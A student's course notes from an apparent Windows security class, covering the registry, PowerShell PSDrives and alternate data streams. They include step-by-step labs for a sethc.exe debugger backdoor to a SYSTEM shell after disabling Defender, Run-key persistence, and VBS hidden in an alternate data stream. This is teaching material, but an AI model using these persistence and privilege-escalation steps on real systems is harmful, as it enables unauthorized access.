#Resources
  ###############################RESOURCES###############################
  #OS Activities
  http://10.50.22.197:8000/
  #Student Guide
  https://os.cybbh.io/public
  stack number: 2
  10.50.38.199


###############################ACTIVITIES LOG###############################
#username
JOBO-M-006
#pw hint
Favorite DS3 knight
###############################BLANK###############################
##############################################################DAY 1##############################################################
###############################REMOTE COMMAND###############################
https://cctc.cybbh.io/students/students/latest/Day_0_Setup.html

#command for xfreerdp
xfreerdp /u:$USER /v:$IP_ADDRESS> /dynamic-resolution +glyph-cache +clipboard
xfreerdp /u:student /v:10.50.38.199 /dynamic-resolution +glyph-cache +clipboard


###############################END###############################
###############################$PROFILE###############################
$PROFILE 
PowerShell supports several profile files and host programs, like Windows, support their own specific profiles. 
The profiles below are listed in order of precedence with the first profile having the highest precedence.

All Users, All Hosts
$PsHome\Profile.ps1

All Users, Current Host
$PsHome\Microsoft.PowerShell_profile.ps1

Current User, All Hosts
$Home\[My]Documents\Profile.ps1

Current User, Current Host
$Home\[My ]Documents\WindowsPowerShell\Profile.ps1



###############################END###############################
##############################################################END OF DAY 1##############################################################
##############################################################DAY 2##############################################################
###############################WINDOWS REGISTRY###############################
1. Windows Registry Introduction
The The Windows Registry is a central hierarchical database used in Windows to store information that is necessary to configure the system for one or more users, applications, and hardware devices.

Think of the Windows Registry like a huge Rolodex.

everything in Windows has a card/place with all of it’s information.

Includes location, information, settings, options, and other values for programs and hardware installed

Why is the registry important?

Anyone can hide all sorts of data including passwords, malicious code, and executable/binary files in the Registry.

They can effectively hide data in registry keys’ value entries.

By using different encoding techniques, they could obfuscate or hide data from forensic examiners.

It is important to know what right looks like and the places that are most likely to be compromised by a malicious actor.

Comparing the Registry in Windows to Linux
The registry in Windows is like a combination of multiple directories in Linux.

For example: Driver information is kept in the registry in Windows, but in /dev in Linux.

System configurations in Windows are in HKEY_LOCAL_MACHINE, but in /etc (and a few other directories) in Linux.

2. Registry structure
2.1 Registry Keys and Values
The registry is comprised of Keys, Subkeys and Values structured in a tree format.

Keys - are known as Registry Hives and can contain subkeys and values.

Subkeys - can contain subkeys and values

Values - contain data in specific formats.

2.2 Registry Hives or Root Keys
A registry hive is a group of keys and thier associated values that are loaded when the system is started or a specific user logs in.

There are five Registry Hives

HKEY_LOCAL_MACHINE

HKEY_USERS

HKEY_CURRENT_USERS

HKEY_CURRENT_CONFIG

HKEY_CLASSES_ROOT



HKEY_LOCAL_MACHINE (HKLM)
Contains configuration information for the entire computer. Its values are read every time the machine is started regardless of the user who logs in. Its subkeys are :
HARDWARE - contains a database of installed devices along with their drivers
SAM - Security Account Manager stores user and group accounts along with NTLM hashes of passwords
Security - Local Security policy accessed by lsass.exe used to determine rights and permissions for users on the machine
System - Contains keys pertaining to system startup such as programs started on boot or driver load order.



HKEY_USERS (HKU)
Contains all all user profiles on the system. Contains one key per user on the system. 
Each key is named after the SID(Security Identifier) of the user.

-User Environment settings for the desktop
-shortcuts
-File associations

A SID has four components:
SID = S-1-5-21-2948704478-3101701159-1111693228-1002
S represents SID
1 revision level (1) - Indicates the version of the SID structure that’s used in a particular SID.
An identifier authority (5, NT Authority) - Identifier Authority: This is a series of digits that identifies the entity that issued the SID. 
In the case of Active Directory, the identifier authority is always "5" for the Security IDentifier Authority (SID Authority).
A domain identifier 21-2948704478-3101701159-1111693228 (48 bit (6 byte) numbers)

Some HKEY_USERS are called Well Known SIDs.. They identify default accounts in Windows used for various purposes. 
In this example the 21 represents the subauthority within the domain identifier. Examples include:
S-1-5-18 refers to LocalSystem account.
S-1-5-19 refers to LocalService account. It is used to run local services that do not require LocalSystem account.
S-1-5-20 refers to NetworkService account. It is used to run network services that do not require LocalSystem account.
S-1-5-21-domain-500 Refers to the built in local administrator account.
-1002 = RID A variable number of subauthority or relative identifier (RID) values that uniquely identify the trustee relative to the authority that issued the SID




HKEY_CURRENT_USER (HKCU)
HKEY_CURRENT_USER is the copy of the logged in user’s registry key based on thier SID from HKEY_USERS.

HKEY_USERS (HIVE)
              └──SID (S-1-5-21-3939661428-3032410992-3449649886-XXXX) (Key)
HKEY_USERS\S-1-5-21-3939661428-3032410992-3449649886-XXXX



HKEY_CURRENT_CONFIG (HKCC)
HKEY_CURRENT_CONFIG is a symbolic link (pointer or shortcut or alias) to the following registry key:

HKEY_Local_Machine (HIVE)
              └──SYSTEM (Key)
                      └──CurrentControlSet (Subkey)
                                    └── Hardware Profiles (Subkey)
                                                └── Current (Subkey)
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Hardware Profiles\Current




HKEY_CLASSES_ROOT (HKCR)
HKEY_CLASSES_ROOT is a symbolic link (pointer or shortcut or alias) to the following registry key:

HKEY_Local_Machine (HIVE)
              └──Software (Key)
                      └──Classes (Subkey)
HKEY_LOCAL_MACHINE\Software\Classes

Contains file name extension associations and COM class registration information such as ProgIDs, CLSIDs, and IIDs.

It is primarily intended for compatibility with the registry in 16-bit Windows

###############################END###############################
###############################BLANK###############################
2.3 Registry Structure and Data Types


Table 1. Registry Path Hive and Supporting Files
HKLM\SAM

SAM, SAM.LOG

HKLM\SECURITY

SECURITY, SECURITY.LOG

HKLM\SOFTWARE

software, software.LOG, software.sav

HKLM\SYSTEM

system, system.LOG, system.sav

HKLM\HARDWARE

(Dynamic/Volatile Hive)

HKU\.DEFAULT

default, default.LOG, default.sav

HKU\SID

NTUSER.DAT

HKU\SID_CLASSES

UsrClass.dat, UsrClass.dat.LOG

The above Table shows the registry path and their corresponding hives on disk.

All hives in HKLM are stored in %SYSTEMROOT%\System32\config\ (%SYSTEMROOT% usually refers to C:\WINDOWS).

HKLM\HARDWARE is a dynamic hive that is created each time the system boots and it is created and managed entirely in memory.

HKU\SID hive file is stored in user home directory, which is %USERPROFILE%\NTUSER.DAT.

HKU\SID_CLASSES hive file correspond to "%USERPROFILE%\Application Data\Local\Microsoft\Windows\UsrClass.dat"

Table 2. Types of extensions and what they mean (Might be hidden)
No extension

Actual Hive File

.alt extension

Backup copy of hive, used in Windows 2000

.log extension

Transaction log of changes to a hive

.sav extension

Backup copy of hive created at the end of text-mode (console)







###############################END###############################
###############################BLANK###############################
3. Registry Manipulation
3.1 View/manipulate the registry with a GUI
regedit.exe

GUI

Located at C:\Windows\regedit.exe

Can connect to a remote registry, but only using the PC’s workgroup or domain Name

Needs the RemoteRegistry Service (svchost.exe / regsvc.dll) to be running to work

Commonly disabled using group policy

Can load hives files from disk to the active registry

Can export binary .hiv files as well as text .reg files

Can only query HKLM and HKU remotely

Regedit.exe shares similarities with the C: drive file hierarchy. Keys can be manipulated just like files.
Using Regedit.exe to query the Registry
Click on the search bar and type in regedit.exe
If prompted by UAC, click yes
Click on the drop down for HKEY_CURRENT_USER
Click the drop down for Software
Click the drop down for Microsoft
Click the drop down for Windows
Click the drop down for CurrentVersion
Click the drop down for Run
We have successfully queried a key using regedit.exe


3.2 View/manipulate the registry via CMDLINE
reg.exe

CLI

Located at C:\Windows\System32\reg.exe

Can connect to a remote registry, using the PC’s NetBios Name or IP address

Does not have to be in workgroup/domain. Only need username/password

Needs the RemoteRegistry Service (svchost.exe / regsvc.dll) to be running to work

Can load hives files from disk to the active registry

Available in XP and beyond

Can only export text .reg files

Can only query HKLM and HKU remotely

Reg.exe Syntax

More Reg.exe Syntax

Reg.exe help
reg /?                    #Displays help for all of the reg.exe commands
reg query /?              #Displays help for the `reg query`
reg add /?                #Displays help for `reg add`
reg delete /?             #Displays help for `reg delete`
Reg query - Reads keys from specific registry locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Reg add - Adds keys to specific registry locations
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v testme /t REG_SZ /d C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
The /v stands for Value; In this case the name of this Key Value.

The /t stands for Type; Types can be any of the Data Types that we went over earlier.

The /d stands for Data; Is what is the actual Data or in this case a command to open a file every time the system is ran.

Reg delete - Deletes Keys
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v testme
3.3 Registry Manipulation with PowerShell


Certain Root Hives are loaded automatically into PSDrives (HKLM: and HKCU:); navigation of the registry is very similar to folder⇒file

Minimum commands to know
Query

Get-ChildItem cmdlet gets the items in one or more specified locations.

Get-ItemProperty cmdlet gets the items in one or more specified locations.

Get-Item cmdlet gets the item at the specified location. It doesn’t get the contents of the item at the location unless you use a wildcard character (*) to request all the contents of the item.

Modify

Set-ItemProperty cmdlet changes the value of the property of the specified item. example, changing setting to :true or :false.

Remove-ItemProperty cmdlet to delete registry values and the data that they store.

Create

New-Item cmdlet creates a new item and sets its value. In the registry, New-Item creates registry keys and entries.

New-Itemproperty cmdlet creates a new property for a specified item and sets its value. Typically, this cmdlet is used to create new registry values, because registry values are properties of a registry key item.



3.3.1 Reading Registry Objects with PowerShell
Get-ChildItem - Reads sub keys from the input value
Get-ChildItem HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 

Get-ChildItem HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\ 
The returns nothing because it is listing the sub keys of \Run.
Run has no sub keys, only values.

Returns sub keys of \CurrentVersion
Get-Item - Reads the value of the inputted object
Get-item HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Notice how the output of the command is different than Get-ChildItem.

It reads key values, not sub keys.



3.3.2 Creating Registry objects with Powershell
New-Item - Creates a new sub key associated within a hive
New-Item "HKLM:\Software\Microsoft\Office\14.0\Security\Trusted Documents\TrustRecords" -Force
Creates a new sub key in Trusted Documents for document.doc

Trusted documents is for documents with active content i.e. embedded macros.
New-ItemProperty - Creates a new value associated with a sub key
New-ItemProperty "HKLM:\Software\Microsoft\Office\14.0\Security\Trusted Documents\TrustRecords" -Name "%USERPROFILE%Downloads/test-document.doc" -PropertyType Binary -Value ([byte[]](0x30,0x31,0xFF)) 

New-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name Test -PropertyType String -Value C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
Creates a new value in the \TrustRecords key
Creates a value in the \Run key
Outside of the scope of the class but in case you want to know more about that byte array


3.3.3 Modifying Registry objects with PowerShell
Rename-ItemProperty - Modifies a value associated with a sub key
Rename-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name SecurityHealth -NewName Test
Remove-ItemProperty - Removes a value associated with a sub key
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Office\14.0\Security\Trusted Documents\TrustRecords" -Name "%USERPROFILE%Downloads/test-document.doc"
Set-ItemProperty - Change the value of a sub key
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name Test -Value Bacon.exe


3.4 Sethc.exe Demonstration
Demo: Demonstrate the application of a registry "tweak" via the GUI and CMD-line using sethc.exe.

What is sethc.exe?

Windows contains a feature called stick keys, which is an accessibility feature to help Windows users who have physical disabilities.

It essentially serializes keystrokes instead of pressing multiple keys at a time, so it allows the user to press and release a modifier key, such as Shift, Ctrl, Alt, or the Windows key, and have it remain active until any other key is pressed.

You activate stick keys by pressing the Shift key 5 times. When you activate stick keys, you are launching a file, C:\Windows\System32\sethc.exe, which executes as SYSTEM.

While this exploit is protected by current AV, you still might see it in customer networks who don’t follow DISA STIGs.



Create a new Registry key using PowerShell
This will create a backdoor onto a box which will trigger Windows Defender. So first we need to disable it.
Disable Windows Defender Real Time Protection
Set-MpPreference -DisableRealtimeMonitoring $TRUE
Sometimes, the previous command may not work as expected. In such cases, you can follow these steps:
Click the Windows button in the lower-left corner of your desktop.
Navigate to "Virus & threat protection."
Under "Virus & threat protection settings," click "Manage settings."
Finally, toggle off "Real-Time protection." These steps will help you turn off real-time protection using the Windows Security interface.
Create a new Registry key using New-Item in PowerShell
new-item "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
Create a new Registry key property using New-ItemProperty in PowerShell
New-ItemProperty -path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name Debugger -Type String -Value C:\Windows\System32\cmd.exe
Calling our new value in order to privilege escalate
Rapidly press the SHIFT key 5 times

A command shell opens

Type whoami

You should be army\john.huntsman or whoever your user account is

Now log off the system and press the SHIFT key 5 times

A command shell opens

Type whoami

Now you are NT AUTHORITY\SYSTEM

As SYSTEM user, we could open the Registry and copy the SAM database to access password hashes
Create a network share to Sysinternals
net use * http://live.sysinternals.com
The net use command allows us to map a network location and navigate it like it is a local directory.

You can run net use and it will show detailed information about currently mapped drives and devices.

Additionally you can run net use /help for a listing of most common parameters.

Type *autoruns -accepteula*
If we are running remote operations on a target, if we run a SysInternals command for the first time, we will be prompted by a popup to accept the EULA. The -accepteula switch will prevent this and prevent us from being discovered.
Using Autoruns to view the created Registry key
In Autoruns, click on the Image Hijacks Button
Right click on the sethc.exe and select Jump to Entry…​
Right click on the sethc.exe key and select export
Name the file "Totally Legit Windows Update" and save it to your Desktop
Delete the sethc.exe key using the GUI

###############################END###############################
###############################BLANK###############################
4. Powershell PSDrives
What is a PowerShell PSDrive?
A Windows PowerShell drive is a data store location that you can access like a file system drive in Windows PowerShell.

You cannot access them by using other Windows tools, such as File Explorer or Cmd.exe.

Basically, a PSDrive creates a temporary or permanent way for PowerShell to navigate the registry just like you could navigate the file system.

Another way to create/use a remote connection is to use PSDrive (PowerShell Drive).

A group of providers connect different forms of storage to PowerShell and make them look like and perform like a file system.



Finding current PSDrives
Get-PSDrive
To create a new Windows PowerShell drive, you must supply three parameters:

A Name for the drive (you can use any valid Windows PowerShell name)

The PSProvider (use "FileSystem" for file system locations, "Registry" for registry locations, and it could also be a shared folder on a remote server.)

The Root, that is, the path to the root of the new drive.



Table 3. What are PSDrive Providers
Providers: "Registry" - for registry locations, "FileSystem" for file system locations

Certificate: for any installed digital certificates

Alias: for aliases used by PowerShell

Function: Provides access to the functions defined in PowerShel

Variable: supports the variables that PowerShell creates, including the automatic variables, the preference variables, and the variables that you create.

WSMAN: (Web Services Manager)lets you add, change, clear, and delete WS-Management configuration data on local or remote computers.

Environment: Provides access to the Windows environment variable.

Table 4. What are PSDrive Names?
PSDrive uses Names for each drive.

Names of the drive can be longer than just a letter and can be as explanatory as you want.

PowerShell needs a : (colon) after the name to change directory to the drive.

Table 5. What’s this all a Root?
Root specifies the data store location to which a PowerShell drive is mapped of a local computer, a remote computer, or even a website.

When Root is a UNC (Universal Naming Convention) path, such as \\Server\Share, the credential specified in the value of the Credential parameter is used to create the PSDrive.

Show all Environmental Variables in the Env: directory
Get-ChildItem Env:
Show all Environmental Variables in the GUI
Control Panel > System > click on Advanced system settings.
Then click on Environmental Variables.
The results should be the same as GCI ENV.
Make a directory for our demo
mkdir demo
Creating a PSDrive
New-PSDrive -Name Demo -PSProvider FileSystem -Root c:\Demo   #Review command: Get-Help New-PSDrive for this syntax.
Show the difference from changing directory to C:\Demo and Demo:
cd C:\Demo
cd Demo:
Creating an invalid PSDrive
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USER
This will create an error. Try and mount the new drive and watch it error out. PowerShell will allow you to create a directory with a Root location that doesn’t exist.
Mounting invalid PSDrive
gci HKU:
Get-ChildItem HKU:
Delete the bad PSDrive
Remove-PSDrive HKU
Now create the drive correctly
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS
Changing directories with PowerShell
cd Registry::HKEY_LOCAL_MACHINE 
cd HKU: 
C: 
Changing directories the default way in PowerShell
Changing directories after mounting with PSDrive
Changing back to c:\ drive
PSDrive Can be used to create shortcuts to commonly used file locations too.
New-PSDrive -Name Desktop -PSProvider FileSystem -Root C:\users\student\Desktop
cd Desktop:
Creating a Shortcut to the Run Key
New-PSDrive -Name HKLM-Run -PSProvider Registry -Root HKEY_Local_Machine\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
cd HKLM-Run:
We can also map network shares with New-PSDrive.
Emulating net use functionality with New-PSDrive
[String]$WebDAVShare = '\\live.sysinternals.com\Tools'          
New-PSDrive -Name S -PSProvider FileSystem -Root $WebDAVShare   
cd S:                                                           
Creating a string variable of '\\live.sysinternals.com\Tools' as if we do not it will fail out.
Using our new Variable $WebDAVShare we can now successfully create the drive.
Changing directories to our link '\\live.sysinternals.com\Tools'.
Map to an Internal Server
New-PSDrive -Name FileServer -PSProvider FileSystem -Root "\\file-server\warrior share"
Disable the task manager using the Regedit GUI
In regedit, navigate to HKCU/SOFTWARE/MICROSOFT/WINDOWS/CURRENTVERSION/POLICIES
Make a new key called "System" by right clicking and selecting New then Key
Add a new DWORD value to that key called "DisableTaskMgr" by right clicking and selecting New then DWORD
Double click the new value and change the 0 to a 1
Try to open task Manager (you will see that you cannot)
Remove the new key by right clicking the key and selecting delete
###############################END###############################
###############################BLANK###############################
5. Registry Locations of Interest


5.1 Do I need to remember all of the locations in the Registry?
The Registry in a Windows 10 Computer has over 3 million entries; it is impossible to know them all.

It is more important to understand the concepts supporting the Windows Registry than to know millions of keys.



5.2 Registry Changes
Changes to the registry often require a restart, as many programs read the registry values upon load.

Whether the entire system needs to be restarted, or just a program, depends on the registry setting changes.

Some changes do take effect immediately, as we saw with the disable taskmgr key that was created.

It is also important to note that some parts of the registry are always loaded into memory.



5.3 Forensically Relevant Keys
These are keys that hold any type of information that can be used to gather intelligence or track events.

These are some but not all of the keys that can be considered relevant to you or your mission set.

SANS Registry Cheat Sheet

Why do we care?
We are looking for keys that can be used for Persistence

Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access

As well as Privilege Escalation.

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network.


Microsoft Edge Internet URL history and Browser Artifacts and Forensics

HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\Children\001\Internet Explorer\DOMStorage



USB history / USB Forensics

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USB

This registry key contains information about all USB devices that have been connected to the system at some point, regardless of whether they are currently connected or not. It includes information about the USB controllers, hubs, and individual devices. Each device is typically identified by a unique identifier (like a device instance path or hardware ID).

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR

This registry key specifically deals with USB storage devices, such as USB flash drives, external hard drives, etc. It contains information about connected USB storage devices, including details like device instance paths, hardware IDs, and other configuration information.



Recent MRU history / MRU in forensics
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU

MRU is the abbreviation for most-recently-used.

This key maintains a list of recently opened or saved files via typical Windows Explorer-style common dialog boxes (i.e. Open dialog box and Save dialog box).

For instance, files (e.g. .txt, .pdf, htm, .jpg) that are recently opened or saved files from within a web browser (including IE and Firefox) are maintained.



Recent Files with LNK files
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs



Windows User Profiles User Account Forensics

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList



Saved Network Profiles and How to decode Network history
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles



Windows Virtual Memory and why it is important
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management

This key maintains Windows virtual memory (paging file) configuration.

The paging file (usually C:\pagefile.sys) may contain evidence/important information that could be removed once the suspect computer is shutdown.



Recent search terms using Windows default search and Cortana
HKEY_CURRENT_USER\Software\Microsoft\Windows Search\ProcessedSearchRoots

Index of Search results by SID

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search

Recent files searched



5.4 Registry locations that can be utilized for persistence
Persistence According to MITRE

Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder - MITRE

Table 6. System-wide and per-user autoruns
HKLM\Software\Microsoft\Windows\CurrentVersion\Run

HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Run

HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\RunOnce

HKLM\SYSTEM\CurrentControlSet\services

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon



5.5 Critical Registry Locations
These are keys that have value for red and blue teams to be taken advantage of.

HKLM\BCD00000000

Replacement of old boot.ini file

HKLM\SAM\SAM

Use "psexec -s -i regedit" from administrator cmd.exe to view the SAM

It opens a new regedit.exe window with system permissions

PSEXEC is a SYSINTERNALS tool.
HKU\<SID>\Software\Policies\Microsoft\Windows\System\Scripts

Group policy Logon/Logoff Scripts defined here
###############################END###############################
###############################BLANK###############################
6. Security
Each key in the registry of Windows NT versions can have an associated Security Descriptor.

The security descriptor contains an Access Control List (ACL) that describes which user groups or individual users are granted or denied access permissions.

An ACL is a list of Access Control Entries (ACE). The security descriptor can be explicit or inherited from a parent object.

Each ACE in an ACL identifies a trustee and specifies the access rights allowed, denied, or audited for that trustee.

The security descriptor for a securable object can contain two types of ACLs: a DACL and a SACL.

A Discretionary Access Control List (DACL) identifies the trustees that are allowed or denied access to a secured object.

A System Access Control List (SACL) enables administrators to log attempts to access a secured object.

Table 7. Registry permissions
Permission

Description

Query Value

The right to read the registry key value.

Set Value

The right to write a new value

Create Subkey

The right to create subkeys.

Enumerate

Subkeys Allow the enumeration of subkeys.

Notify

The right to request change notifications for registry keys or subkeys.

Create Link

Reserved by the operating system.

Delete

The right to delete a key.

Write DACL

The right to modify permissions of the container’s DACL.

Write Owner

The right to modify the container’s owner.

Read Control

The right to read the DACL.

Special ACEs on the security descriptor can also implement Mandatory Integrity Control for the registry key and subkeys.

A process running at a lower integrity level cannot write, change or delete a registry key/value, even if the account of the process has otherwise been granted access through the ACL.

An example would be if Internet Explorer is running in Protected Mode and can read medium and low integrity registry keys/values of the currently logged on user, but it can only modify low integrity keys.
Windows Resource Protection uses security to deny Administrators and the system WRITE access to some sensitive keys to protect the integrity of the system from malware and accidental modification.
###############################END###############################
##############################################################ADS##############################################################
###############################BLANK###############################
1. Alternate Data Streams
ADS was first introduced to NTFS in Windows NT 3.1 and was Microsoft’s attempt at implementing filesystem forks in order to maintain compatibility with other filesystems like Apple’s HFS+ and Novell’s NWFS and NSS.

In NTFS – files consists of attributes, security settings, mainstreams and alternate streams. By default, only the mainstream is visible.

ADS has been used to store metadata, like file attributes, icons, image thumbnails.

Great way to hide data using NTFS.

Can be scanned by antivirus (Windows Defender Smartscreen is ADS aware).

Does not change the MD5 hash of the file.

Deleted once copied to a fat32.

Cannot be disabled.

[filename.extension]:[alternate_stream_name]:$DATA

###############################END###############################
###############################BLANK###############################
2. Alternate Data Streams in Command Prompt
The demonstrations below are the basics of creating and viewing alternate data streams on a file and directory. The ADS demo will need a elevated command prompt (cmd.exe) and also an elevated PowerShell or PowerShell ISE window. You should understand that just because something isn’t viewable by normal means, doesn’t mean something isn’t hidden. It thus becomes important to understand the commands used to enumerate, recognize indicators, and list contents for ADS.



Perform steps below in an elevated CMD shell.

1. Creating a regular data stream on a file
C:\windows\system32>echo Always try your best > reminder.txt 

C:\windows\system32>dir reminder.txt 
 Directory of C:\windows\system32
 02/27/2021 07:13 PM                 25 reminder.txt
                1 File(s)            25 bytes
                0 Dir(s) 20,060,768,688 bytes free

C:\windows\system32>type reminder.txt 
Always try your best
echo content Always do your best into new file called reminder.txt.
dir, for files, displays the file name extension and size in bytes.
type displays contents of a text file, showing Always do your best.


2. Creating an Alternate Data Stream on a file
C:\windows\system32>echo social security numbers > reminder.txt:secret.info 

C:\windows\system32>dir reminder.txt 
 Directory of C:\windows\system32
 02/27/2021 07:13 PM                  23 reminder.txt
                 1 File(s)            23 bytes
                 0 Dir(s) 20,060,712,960 bytes free

C:\windows\system32>type reminder.txt 
Always try your best
echo content social security numbers into the ADS :secret.info of reminder.txt.
dir shows no visible change to reminder.txt even after previous added ADS content.
type shows no visible change to content of reminder.txt even after previous added ADS content.
Refs: dir / echo / type



3. Viewing an Alternate Data Stream on a file.
C:\windows\system32>more < reminder.txt:secret.info 
social security numbers

C:\windows\system32>notepad reminder.txt:secret.info 

C:\windows\system32>dir /R reminder.txt 
 Directory of C:\windows\system32
 02/27/2021 07:13 PM                   23 reminder.txt
                                       26 reminder.txt:secret.info:$DATA
                1 File(s)              23 bytes
                0 Dir(s)   20,060,557,312 bytes free

C:\windows\system32>type reminder.txt:secret.info 
The filename, directory name, or volume label syntax is incorrect.
Read contents of reminder.txt:secret.info into more, showing ADS content social security numbers.
Shows another way to view ADS content using notepad.
dir /R displays the ADS info (not the same as listing the ADS contents however). $DATA will be discussed later.
Unfortunately, some commands and applications like the type are unable to list ADS content.


4. Creating and Viewing an Alternate Data Stream on a directory
C:\windows\system32>mkdir kids 

C:\windows\system32>echo top-secret information > kids:hidden.txt 

C:\windows\system32>dir /R kids 
 Directory of C:\windows\system32\kids
 02/27/2021 07:29 PM      <DIR>           .
                                       25 .:hidden.txt:$DATA
 02/27/2021 07:29 PM      <DIR>           ..
               0 File(s)                0 bytes
               2 Dir(s)    20,060,160,000 bytes free

C:\windows\system32>more < kids:hidden.txt 
top-secret information
mkdir creates a directory called kids.
echo writes content top-secret information in ADS to kids:hidden.txt.
dir /R shows ADS info for kids directory. Notice the ADS hidden.txt created earlier and the main stream $DATA.
more shows ADS contents of kids:hidden.txt and we see top-secret information.
###############################END###############################
###############################BLANK###############################
3. Alternate Data Streams in PowerShell
1. Creating a regular data stream on a file.
PS C:\windows\system32>echo "Always do your best" > reminder.txt 

PS C:\windows\system32>Get-ChildItem .\reminder.txt 
    Directory: C:\windows\system32
Mode                LastWriteTime        Length  name
----                -------------        ------  ----
-a----           2/28/2021  2:40 AM          44   reminder.txt

PS C:\windows\system32>Get-Content reminder.txt 
Always do your best
echo content Always do your best into a new file called reminder.txt.
Get-ChildItem, just like dir example, will show a file’s attributes, last modified time (LastWriteTime), size (Length), and name.
Get-Content shows the content of the file reminder.txt: Always do your best.


2. Creating an Alternate Data Stream on a file.
PS C:\windows\system32>Set-Content .\reminder.txt -Value "social security numbers" -Stream secret.info 

PS C:\windows\system32>Get-Childitem reminder.txt 
    Directory: C:\windows\system32
Mode                LastWriteTime        Length  name
----                -------------        ------  ----
-a----           2/28/2021  2:41 AM          44   reminder.txt

PS C:\windows\system32>Get-Content reminder.txt 
Always do your best
Set-Content writes new or replaces existing content in a file; Using -Value and -Stream to create an ADS on reminder.txt.
Get-Childitem shows no visible change to reminder.txt even after previous added ADS content.
Get-Content shows no visible change to content of reminder.txt even after previous added ADS content.


3. Viewing an Alternate Data Stream on a file.
PS C:\windows\system32>Get-Item reminder.txt -Stream * 
PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\windows\system32\reminder.txt::$DATA
PSParentPath : Microsoft.PowerShell.Core\FileSystem::C:\windows\system32
PSChildName : reminder.txt::$DATA
PSDrive       : C
PSProvider    : Microsoft.PowerShell.Core\FileSystem
PSIsContainer : False
FileName      : C:\windows\system32\reminder.txt 
Stream        : :$DATA 
Length        : 44

PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\windows\system32\reminder.txt:secret.info
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\windows\system32
PSChildName  : reminder.txt:secret.info
PSDrive       : C
PSProvider    : Microsoft.PowerShell.Core\FileSystem
PSIsContainer : False
FileName      : C:\windows\system32\reminder.txt
Stream        : secret.info 
Length        : 25

PS C:\windows\system32>Get-Content reminder.txt -Stream secret.info 
social security numbers
Get-Item with the -Stream option allows us to see all streams for *reminder.txt.
FileName property provides the full path info for reminder.txt.
Stream property lists $DATA which is the main stream and commonly expected on most files. $DATA is the actual content.
Stream property lists secret.info which is an ADS to be investigated since it is outside the norm.
Get-Content with option and value -Stream secret.info gets us our ADS content, social security numbers.
The last command can be further improved to list only the FileName and Stream properties.
Get-Item reminder.txt -Stream * | select FileName,Stream
###############################END###############################
###############################BLANK###############################
4. Malicious Alternate Data Streams
In this demonstration, we will show how malicious logic can be embedded in an Alternate Data Stream to execute on a system. There are a plethora of ways a malicious ADS could be triggered to exploit vulnerabilities in a system and grant access or establish persistence for a bad guy.

1. Creating a Malicious Alternate Data Stream
PS C:\windows\system32> Write-Output "Nothing to see here!" > test.txt 

PS C:\windows\system32>Add-Content -Path .\test.txt -Value 'Dim oShell' -Stream 'secret.vbs' 
PS C:\windows\system32>Add-Content -Path .\test.txt -Value 'Set oShell = Wscript.CreateObject ("Wscript.Shell")' -Stream 'secret.vbs'
PS C:\windows\system32>Add-Content -Path .\test.txt -Value 'oShell.run "cmd /k CD C:\Program Files & ping 8.8.8.8" ,1 , true ' -Stream 'secret.vbs'

PS C:\windows\system32>Get-Content .\test.txt 
Nothing to see here!

PS C:\windows\system32>Get-Content .\test.txt -Stream secret.vbs 
Dim oShell
Set oShell = Wscript.CreateObject ("Wscript.Shell")
oShell.run "cmd /k CD C:\Program Files & ping 8.8.8.8" ,1 , true
Write-Output functions like echo and sends the content Nothing to see here! to a new file called test.txt.
Add-Content lines add some Visual Basic Studio (VBS) code to the ADS secret.vbs on test.txt.
Get-Content shows no visible change to test.txt even after previous added ADS content.
With -Stream secret.vbs we see our ADS content.


2. Executing a Malicious Alternate Data Stream
PS C:\windows\system32>wscript .\test.txt:secret.vbs 
_opens CMD.exe and pings google_
wscript part of Windows Script Host allows us to run the VBS code contained in .\test.txt:secret.vbs


3. Output
Pinging 8.8.8.8 with 32 bytes of data: 
Reply from 8.8.8.8: bytes=32 time=6ms TTL 113
